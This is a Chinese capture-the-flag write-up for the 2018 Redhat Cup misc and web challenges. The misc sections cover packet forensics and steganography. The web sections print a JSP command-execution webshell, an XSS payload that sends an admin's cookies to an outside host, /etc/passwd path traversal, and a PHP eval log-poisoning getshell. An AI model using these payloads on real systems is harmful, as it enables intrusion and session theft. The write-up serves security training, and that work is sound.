> 原文链接: https://www.anquanke.com//post/id/107005 


# 2018-redhat-misc&amp;web-writeup


                                阅读量   
                                **295990**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01e3ef31a392ad86d1.jpg)](https://p2.ssl.qhimg.com/t01e3ef31a392ad86d1.jpg)

## 前记

刚打完广东省的省赛红帽杯，除了web3很难受，并没有顺利完成外，差不多把misc和web都ak了，可能是题目难度可能比较适中吧= =，记录了一下所有题解

<!--StartFragment -->



## Misc

### <a class="reference-link" name="Not%20Only%20Wireshark"></a>Not Only Wireshark

拿到流量包后，全部浏览了一遍，发现可疑数据很少<br>
但是其中有一点引起了我的注意<br>
即有一个ip，不断的向example2.php的name参数提交16进制<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ed9194cad6033eba.jpg)<br>
好奇的我迅速写了一个脚本，将这些16进制提取出来，拼接在一起

```
#!/usr/bin/env python
#coding:utf-8
import re
data = ''
f = open('./1.pcapng','r')
res = f.read()
ress = re.findall('example2.(.*)',res)
for x in ress:
    if len(x) != 22:
        # print len(x) 
        continue
    else:
        print x[9:12]
        data += x[9:12]
q = open('./hex.txt','w')
q.write(data)
q.close()
```

注:windows下可能无法使用，貌似读不到pcapng的文件,linux下正常运行<br>
得到文件

```
123404B03040A0001080000739C8C4B7B36E495200000001400000004000000666C616781CD460EB62015168D9E64B06FC1712365FDE5F987916DD8A52416E83FDE98FB504B01023F000A0001080000739C8C4B7B36E4952000000014000000040024000000000000002000000000000000666C61670A00200000000000010018000DB39B543D73D301A1ED91543D73D301F99066543D73D301504B0506000000000100010056000000420000000000
```

敏感的我发现了

```
404B0304
```

这样的开头<br>
随机更改为

```
504B0304
```

保存为zip文件后打开<br>[![](https://p0.ssl.qhimg.com/t016dc488d1151a8480.jpg)](https://p0.ssl.qhimg.com/t016dc488d1151a8480.jpg)<br>
发现需要密码，继续探查流量包<br>
发现一条数据

```
example4.php?key=?id=1128%23
```

尝试密码

```
?id=1128%23
```

发现成功打开压缩包<br>
得到flag

```
flag`{`1m_s0_ang4y_1s`}`
```

### <a class="reference-link" name="%E5%90%AC%E8%AF%B4%E4%BD%A0%E4%BB%AC%E5%96%9C%E6%AC%A2%E6%89%8B%E5%B7%A5%E7%88%86%E7%A0%B4"></a>听说你们喜欢手工爆破

文件下载后，发现是一个iso文件<br>
我将其挂载后，发现3类文件

```
1个压缩包rar,需要密码才能打开
一堆hash文件名的txt
一堆16进制文件名的txt
```

打开txt的内容均为

```
VGgzcjMgMXMgbjAgZjFhZw==
```

解码后发现

```
Th3r3 1s n0 f1ag
```

去尝试打开压缩包，发现有密码，简单爆破无果<br>
随机尝试将hash文件名做为一个字典，用字典进行爆破<br>
给出部分

```
019c14cfa5d50ee13056be18da485be9
01a30f774669ccd9baa8fdb69173f53f
022031d7848893d860728a779088aaef
026cc036b3b889053a8d67f82153ec9e
0326f7307cf01b2e167fbc7505949e37
0328fc8b43cb2ddf89ba69fa5e6dbc05
0354b66f7915ba15bf65559ed286b909
04b13bd02884173c14465de93354c168
05b86d34f968c234e51147700776187f
06045bb6bbe276da85384a1fe1b882f4
064c7cd3481baedcf33679d47d02f42c
066de521fd36a75325da1542a77a93d7
091d24ceeba875f15d2a37cc99451ecc
0963478c03b02022753825abc0248422
09c1af2ef9c348a790535d9adc9e8da9
0a62632d6910587b5b9e751be66fff89
.....
```

爆破迅速得到了密码<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01775d002656fc3327.jpg)<br>
密码为

```
0328fc8b43cb2ddf89ba69fa5e6dbc05
```

解压后得到一篇word文章<br>
同样有密码<br>
尝试下载了一个word密码暴力破解工具

```
aoxppr.exe
```

很快也爆破出了密码<br>[![](https://p1.ssl.qhimg.com/t011b95ca794e45830e.jpg)](https://p1.ssl.qhimg.com/t011b95ca794e45830e.jpg)

```
5693
```

查看文件内容，发现关键语句

```
并给他邮箱发了新家里的门禁解锁代码：“123654AAA678876303555111AAA77611A321”，希望他能够成为她的新家庭中的一员。
```

思考这是什么加密方式，发现word文件名为情系海边之城<br>
百度一下<br>
得到结果

```
海边的曼彻斯特(又名情系海边之城)
```

立刻想到曼彻斯特编码<br>
写了个脚本

```
n=0x123654AAA678876303555111AAA77611A321
flag=''
bs='0'+bin(n)[2:]
r=''
def conv(s):
    return hex(int(s,2))[2:]
for i in range(0,len(bs),2):
    if bs[i:i+2]=='01':
        r+='0'
    else:
        r+='1'
print r
for i in range(0,len(r),8):
    tmp=r[i:i+8][::-1]
    flag+=conv(tmp[:4])
    flag+=conv(tmp[4:])
print flag.upper()
```

运行后即可得到flag

```
flag`{`5EFCF5F507AA5FAD77`}`
```

### <a class="reference-link" name="%E8%BF%99%E6%98%AF%E9%81%93web%E9%A2%98%EF%BC%9F"></a>这是道web题？

拿到文件后发现是cms：`yunCMS`<br>
本能的拿webshell查杀工具进行扫描<br>[![](https://p4.ssl.qhimg.com/t010feb93572ed4aa5b.jpg)](https://p4.ssl.qhimg.com/t010feb93572ed4aa5b.jpg)<br>
发现2个危险系数极高的文件<br>
依次查看，发现一段文字<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b504ca3028e99dea.jpg)<br>
提示我们寻找流量包<br>
于是我们查找根文件夹下所有目录里的流量包

```
.//statics/az/com_default/images/6ac9899c-4008-11e8-9d36-32001505e920.pcapng
.//yuncms/libs/classes/320c2066-3fc1-11e8-a169-32001505e920.pcapng
.//yuncms/modules/az/install/languages/a44cff82-3fc2-11e8-bd7d-32001505e920.pcapng
.//yuncms/modules/az/fields/catids/4d4961d0-3fc2-11e8-b05b-32001505e920.pcapng
.//yuncms/modules/az/fields/text/78466550-3fc1-11e8-9828-32001505e920.pcapng
.//api/af56c7c0-3fc0-11e8-934e-32001505e920.pcapng
.//caches/caches_yp/caches_data/set/f49a6814-3fc0-11e8-a116-32001505e920.pcapng
```

得到一共7个流量包文件<br>
为了快速找到问题，我直接定位到文字中的关键字`Georgia`<br>
以此迅速找到了含有该关键词的流量包

```
78466550-3fc1-11e8-9828-32001505e920.pcapng
```

随即在里面找出了可疑图片<br>[![](https://p2.ssl.qhimg.com/t01dda1c88f68e1401f.jpg)](https://p2.ssl.qhimg.com/t01dda1c88f68e1401f.jpg)<br>
查看ffd9后的文件头<br>
发现存在gif文件<br>[![](https://p3.ssl.qhimg.com/t01d31bc2492ab81192.jpg)](https://p3.ssl.qhimg.com/t01d31bc2492ab81192.jpg)<br>
导出后用stegsolve一帧一帧看，发现一串密文

```
&amp;#102
&amp;#108
&amp;#97
&amp;#103
&amp;#123
&amp;#83
&amp;#48
&amp;#50
&amp;#50
&amp;#121
&amp;#52
&amp;#111
&amp;#114
&amp;#114
&amp;#53
&amp;#125
```

解码得到flag

```
flag`{`S022y4orr5`}`
```



## Web

### <a class="reference-link" name="simple%20upload"></a>simple upload

进入题目后来到登录页面<br>
直接登录或者注入，都是用户名/密码错误<br>
后来注意到cookie中有

```
admin
```

这一栏，值为0<br>
手动改为1<br>
保存后再随便登录，即可登录成功<br>
发现来到文件上传页面<br>
随便上传一个php文件测试<br>
发现提示只能上传图片<br>
随机更改`Content-Type`为`image/jpeg`<br>
即可上传任意文件<br>
但是上传的php文件，发现访问后直接下载成功<br>
我一度以为服务器无法解析php语言，后来直到我访问

```
http://83bb4e6ae2834a409a8fc6186638304ae4cfd02e70c340eb.game.ichunqiu.com/12
```

一个不存在的路径，报错得到

```
Apache Tomcat/8.5.30
```

我才意识到这是一个jsp的网站<br>
随机我找了一个jsp的小马

```
&lt;%
    if("023".equals(request.getParameter("pwd")))`{`
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("&lt;pre&gt;");
        while((a=in.read(b))!=-1)`{`
            out.println(new String(b));
        `}`
        out.print("&lt;/pre&gt;");
    `}`
%&gt;
```

随机上传，得到路径

```
File uploaded to /784a0215-d519-405d-ab2d-d6bbd03d3ceb/123.jsp
```

执行命令

```
view-source:http://83bb4e6ae2834a409a8fc6186638304ae4cfd02e70c340eb.game.ichunqiu.com/784a0215-d519-405d-ab2d-d6bbd03d3ceb/123.jsp?pwd=023&amp;i=ls /
```

得到

```
bin
dev
etc
flag
home
lib
media
mnt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

随即

```
view-source:http://83bb4e6ae2834a409a8fc6186638304ae4cfd02e70c340eb.game.ichunqiu.com/784a0215-d519-405d-ab2d-d6bbd03d3ceb/123.jsp?pwd=023&amp;i=cat /flag
```

得到flag

```
flag`{`bba8cad9-7c5f-4d16-ab4b-a052fcc01129`}`
```



### <a class="reference-link" name="shopping%20log"></a>shopping log

拿到题目

```
http://123.59.141.153/
```

访问发现

```
&lt;!-- Site is tmvb.com --&gt;
```

一开始并不知道要干什么，后来发现是要我们改host<br>
抓包后更改http header

```
GET / HTTP/1.1
Host: www.tmvb.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8
If-None-Match: "19-56ae7b5677840"
If-Modified-Since: Sat, 28 Apr 2018 12:24:57 GMT
Connection: close
```

得到回显

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;h1&gt;GO BACK HACKER!!! &lt;br&gt;WE ONLY WELCOME CUSTOMERS FROM DWW.COM&lt;/h1&gt;
&lt;/html&gt;
```

接着更改referer

```
GET / HTTP/1.1
Host: www.tmvb.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36
referer: www.DWW.COM
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8
If-None-Match: "19-56ae7b5677840"
If-Modified-Since: Sat, 28 Apr 2018 12:24:57 GMT
Connection: close
```

得到下一步

```
&lt;!-- Japan sales only --&gt;
```

发现要日语<br>
接着更改

```
Accept-Language: ja
```

最终访问成功，到达页面

```
5a560e50e61b552d34480017c7877467info.php
```

页面内容为

```
&lt;body&gt;

        &lt;div style="width: 100%; height: 100%;" id="divTiquMain"&gt;
            &lt;div id="divParam" style="width: 100%; height: 100%; text-align: center; vertical-align: middle;"&gt;
                &lt;h1&gt;购物信息查询&lt;/h1&gt;

                &lt;hr /&gt;
                订单编号：&lt;input type="text" id="TxtTid" placeholder="请输入订单编号后四位" style="margin-right: 30px;" /&gt;
                验证码：&lt;input type="text" id="code" placeholder="code" style="width:40px;" /&gt;&lt;p&gt;substr(md5(code),0,6) === '8a4e87'&lt;/p&gt;

                &lt;button type="button" id="report" class="btn btn-info btn-block"&gt;
                                        查询
                                    &lt;/button&gt;
                &lt;hr /&gt;
            &lt;/div&gt;



            &lt;div style="text-align: center;"&gt;
                Copyrignt by ailibaba corp. 版权所有 ailibaba 
                &lt;br&gt;
                如有任何问题，&lt;a href="https://www.google.co.jp/search?q=md5%20%E7%A2%B0%E6%92%9E"&gt;请联系&lt;/a&gt;
            &lt;/div&gt;
        &lt;/div&gt;


&lt;/body&gt;
&lt;/html&gt;
&lt;script src="js/jquery.min.js"&gt;&lt;/script&gt;
&lt;script type="text/javascript"&gt;
function report()`{`
    $.post('api.php?action=report',`{`'TxtTid':$('#TxtTid').val(),'code':$('#code').val()`}`,function(data)`{`
        alert(data['msg']);
    `}`);
`}`
$('#report').click(report);
&lt;/script&gt;
```

发现是一个订单查询系统，由于题目放出提示，此题不需要注入，于是猜想是找到正确的订单号<br>
随机写了一个爆破脚本

```
import requests
import hashlib
import re
def md5(a):
    b = hashlib.md5(a).hexdigest()
    return b
url = "http://120.132.95.234/5a560e50e61b552d34480017c7877467info.php"

header = `{`
"Host":"www.tmvb.com",
"Cache-Control":"max-age=0",
"Upgrade-Insecure-Requests":"1",
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
"referer":"www.DWW.COM",
"Accept-Language":"ja",
"If-None-Match":'''"19-56ae7b5677840"''',
"If-Modified-Since":"Sat, 28 Apr 2018 12:24:57 GMT",
"Connection":"close"
`}`
def getcode(codeneed):
    for i in xrange(1,999999999):
        if md5(str(i))[0:6] == codeneed:
            return i
for dingdan in range(9599,1000,-1):
    try:
        r = requests.get(url=url, headers=header,timeout=10)
        my_cookie = r.headers['Set-Cookie'][10:36]
        code_conetent = re.findall('&lt;p&gt;.*?&lt;/p&gt;', r.content)[0][30:36]
        my_code = getcode(code_conetent)
        cookie = `{`
            "PHPSESSID": my_cookie
        `}`
        data = `{`
            "TxtTid": dingdan,
            "code": my_code
        `}`
        try:
            url1 = "http://120.132.95.234/api.php?action=report"
            s = requests.post(url=url1, data=data, headers=header, cookies=cookie, timeout=10)
            print str(dingdan)+" "+s.content
        except:
            print str(dingdan) + " failed"
    except:
        print str(dingdan)+" failed"
```

跑了一会儿得到flag

```
9588 `{`"error":0,"msg":"Congradulations, your flag is flag`{`hong_mao_ctf_hajimaruyo`}`n"`}`
```



### <a class="reference-link" name="guess%20id"></a>guess id

此题巨坑<br>
题目给出了3个功能

```
1.注册
2.登录
3.修改个人信息
```

一开始我以为问题出在注册上<br>
在我疯狂测试后，发现身份证号和国籍如果过长，会让数据库抛出错误

```
注册失败, error: (_mysql_exceptions.DataError) (1406, "Data too long for column 'native_place' at row 1") [SQL: u'INSERT INTO user_info (name, password, id_card_number, `role`, age, native_place, status, create_time) VALUES (%s, %s, %s, %s, %s, %s, %s, %s)'] [parameters: (u'111111', '6512bd43d9caa6e02c990b0a82652dca', 'mJc4hgnmPywMze9yHhW05g==', 1, 18, 'MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx', 1, None)] (Background on this error at: http://sqlalche.me/e/9h9h)
```

于是我发现，mmp<br>
可控的身份证号和籍贯被base64后再进行数据库操作<br>
用户名直接只允许字母+数字，而密码是被md5后才进行操作<br>
所以根本不存在注入问题<br>
那么问题只能出在修改个人信息上了？<br>
这里我也是真的服了，不知道什么原因，我们修改个人信息，竟然后台会有Bot自动点，进行查看？<br>
我还是自己随便测试xss发现的……真的是为了出题而出题，服了<br>
但是事情并没有这么简单<br>
在我一顿测试后，发现payload

```
&lt;script&gt;
var i=document.createElement("iframe");
i.src="http://120.132.94.238/?user_search=admin";
i.id="a";
document.body.appendChild(i);
i.onload = function ()`{`
      var c=document.getElementById('a').contentWindow.document.cookie;
    location.href="http://ugelgr.ceye.io/?"+c;
`}`
&lt;/script&gt;
```

可以成功打回admin的cookie

```
http://vps_ip/?name=admin; page=index; token=UFqNJO02PZZmrBJbWVmeMcdvWnWo7gcL; show_text=QUVTMjU25piv5b6I5qOS55qE5Yqg5a+G566X5rOV77yMIEVDQuaooeW8j+W+iOWuueaYk+eQhuinow==; adminview=&lt;script&gt;
var i=document.createElement("iframe");
i.src="http://123.59.134.192/?user_search=admin";
i.id="a";
document.body.appendChild(i);
i.onload = function ()`{`
      var c=document.getElementById('a').contentWindow.document.cookie;
    location.href="http://vps_ip/?"+c;
`}`
&lt;/script&gt;
```

奇葩的是，我用这个token和name进行cookie更改，竟然无法成为admin？？？？<br>
我向客服反映了这个问题后，再用同样的payload，就再也收不到admin的cookie了??<br>
我是真的懵逼+服气，更何况这里第一次收到的admin的cookie里还有我的原封payload呀！<br>
所以导致这个题我最终没能成功破解，真的难受<br>
(此题是全场唯一一个0血的题目，我严重怀疑环境问题)<br>
后来官方给出了后续思路为:<br>
这题需要结合身份证号前六位和籍贯相关，加上出生年月，爆破剩下的位数<br>
再结合我打回的cookie的管理员信息

```
QUVTMjU25piv5b6I5qOS55qE5Yqg5a+G566X5rOV77yMIEVDQuaooeW8j+W+iOWuueaYk+eQhuinow==
```

即AES256是很棒的加密算法， ECB模式很容易理解<br>
应该是要我们爆破AES的key把。。。后续我也不再复现了，应该只是爆破时间问题



### <a class="reference-link" name="biubiubiu"></a>biubiubiu

这个题还挺有意思的<br>
首先上来是一个登陆页面，随便就能登入<br>
只要用户名符合email格式，例如

```
1@1
1
```

即可登入<br>
登入后发现链接

```
http://ecbedb39ad3a4d4c9fc437bc175e8f6d55ecf72506af43a0.game.ichunqiu.com/index.php?page=send.php
```

先尝试读文件

```
http://ecbedb39ad3a4d4c9fc437bc175e8f6d55ecf72506af43a0.game.ichunqiu.com/index.php?page=../../../../etc/passwd
```

得到回显

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false mysql:x:999:999::/home/mysql:
```

发现可以读取文件，但是似乎不能读源码<br>
同时网站存在另一个功能:curl<br>
但是发现curl是不会有回显的<br>
同时执行命令带出发现也不可行<br>
这时候想到日志文件包含拿shell的方法<br>
首先我触发了网页报错

```
http://ecbedb39ad3a4d4c9fc437bc175e8f6d55ecf72506af43a0.game.ichunqiu.com/index.
```

得到回显

```
nginx/1.10.3
```

于是我尝试nginx日志文件的默认位置

```
http://ecbedb39ad3a4d4c9fc437bc175e8f6d55ecf72506af43a0.game.ichunqiu.com/index.php?page=../../../../var/log/nginx/access.log
```

得到内容

```
10.10.0.9 - - [01/May/2018:13:47:57 +0000] "GET / HTTP/1.0" 302 21 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-327.36.3.el7.x86_64" 10.10.0.9 - - [01/May/2018:13:47:57 +0000] "GET /index.php?page=login.php HTTP/1.0" 200 778 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-327.36.3.el7.x86_64" 10.10.0.9 - - [01/May/2018:13:57:13 +0000] "GET / HTTP/1.0" 302 21 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36" 10.10.0.9 - - [01/May/2018:13:57:13 +0000] "GET /index.php?page=login.php HTTP/1.0" 200 778 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36" 10.10.0.9 - - [01/May/2018:13:57:13 +0000] "GET /css/style.css HTTP/1.0" 200 2503 "http://ecbedb39ad3a4d4c9fc437bc175e8f6d55ecf72506af43a0.game.ichunqiu.com/index.php?page=login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36" 10.10.0.9 - - [01/May/2018:13:57:13 +0000] "GET /favicon.ico HTTP/1.0" 404 571 "http://ecbedb39ad3a4d4c9fc437bc175e8f6d55ecf72506af43a0.game.ichunqiu.com/index.php?page=login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36" 10.10.0.9 - - [01/May/2018:13:57:57 +0000] "POST /index.php?page=login.php HTTP/1.0" 302 373 "http://ecbedb39ad3a4d4c9fc437bc175e8f6d55ecf72506af43a0.game.ichunqiu.com/index.php?page=login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36" 10.10.0.9 - - [01/May/2018:13:57:57 +0000] "GET /index.php?page=send.php HTTP/1.0" 200 1126 "http://ecbedb39ad3a4d4c9fc437bc175e8f6d55ecf72506af43a0.game.ichunqiu.com/index.php?page=login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36" 10.10.0.9 - - [01/May/2018:13:57:57 +0000] "GET /css/styles.css HTTP/1.0" 200 5319 "http://ecbedb39ad3a4d4c9fc437bc175e8f6d55ecf72506af43a0.game.ichunqiu.com/index.php?page=send.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36" 10.10.0.9 - - [01/May/2018:13:57:58 +0000] "GET /1.jpg HTTP/1.0" 200 13581 "http://ecbedb39ad3a4d4c9fc437bc175e8f6d55ecf72506af43a0.game.ichunqiu.com/css/styles.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36" 10.10.0.9 - - [01/May/2018:13:58:40 +0000] "GET /index.php?page=../../../../etc/passwd HTTP/1.0" 200 970 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36" 10.10.0.9 - - [01/May/2018:14:02:36 +0000] "GET /index. HTTP/1.0" 404 571 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36"
```

发现真的可以读取日志文件<br>
我尝试污染日志文件

```
http://ecbedb39ad3a4d4c9fc437bc175e8f6d55ecf72506af43a0.game.ichunqiu.com/index.php?&lt;?php @eval($_POST[sky]);?&gt;
```

但是发现日志中的代码以及被url编码了

```
%3C?php%20@eval(x5C$_POSTx5C[skyx5C]);?%3E
```

这样显然包含不成功，这时候curl的功能就能体现了<br>
找到一篇参考文章

```
https://www.cnblogs.com/my1e3/p/5854897.html
```

于是我们构造

```
http://127.0.0.1/index.php?&lt;?php @eval($_POST[sky]);?&gt;
```

即可包含getshell<br>
后再数据库中发现了flag<br>[![](https://p2.ssl.qhimg.com/t01b06bfbf75dc98ae3.jpg)](https://p2.ssl.qhimg.com/t01b06bfbf75dc98ae3.jpg)



## 后记

能力有限，若有错误，请更正指出，谢谢！
